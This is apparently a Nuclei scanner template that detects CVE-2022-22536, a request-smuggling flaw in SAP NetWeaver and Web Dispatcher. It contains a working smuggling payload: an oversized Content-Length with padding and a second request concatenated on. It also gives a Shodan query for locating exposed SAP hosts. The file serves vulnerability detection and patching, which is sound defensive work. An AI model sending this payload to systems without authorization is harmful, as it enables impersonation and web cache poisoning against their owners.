id: CVE-2022-22536
info:
  name: SAP Memory Pipes (MPI) Desynchronization
  author: pdteam
  severity: critical
  description: Multiple SAP applications are vulnerable to request smuggling and concatenation
    attacks, allowing unauthenticated attackers to execute functions impersonating
    the victim or poison intermediary web caches, potentially compromising system
    confidentiality, integrity, and availability.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22536
  - https://wiki.scn.sap.com/wiki/display/PSR/SAP+Security+Patch+Day+-+February+2022
  - https://github.com/Onapsis/onapsis_icmad_scanner
  - https://blogs.sap.com/2022/02/11/remediation-of-cve-2022-22536-request-smuggling-and-request-concatenation-in-sap-netweaver-sap-content-server-and-sap-web-dispatcher/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-22536
    cwe-id: CWE-444
  metadata:
    shodan-query: http.favicon.hash:-266008933
    impact: The vulnerability could result in the compromise of Confidentiality, Integrity
      and Availability of the system through request smuggling and concatenation attacks,
      allowing for malicious impersonation and web cache poisoning.
    recommendation: It is strongly recommended to apply the latest security patches
      from SAP to address the vulnerability and prevent any potential request smuggling
      and request concatenation attacks that could result in significant damage to
      Confidentiality, Integrity, and Availability of the system.
  tags: cve,cve2022,sap,smuggling,netweaver,web-dispatcher,memory-pipes,kev
requests:
- raw:
  - 'GET {{sap_path}} HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 82646

    Connection: keep-alive


    {{repeat("A", 82642)}}


    GET / HTTP/1.1

    Host: {{Hostname}}


    '
  payloads:
    sap_path:
    - /sap/admin/public/default.html
    - /sap/public/bc/ur/Login/assets/corbu/sap_logo.png
  unsafe: true
  read-all: true
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: dsl
    dsl:
    - contains(tolower(body), 'administration')
    - 'contains(tolower(all_headers), ''content-type: image/png'')'
    condition: or
  - type: word
    part: body
    words:
    - HTTP/1.0 400 Bad Request
    - HTTP/1.0 500 Internal Server Error
    - HTTP/1.0 500 Dispatching Error
    condition: or
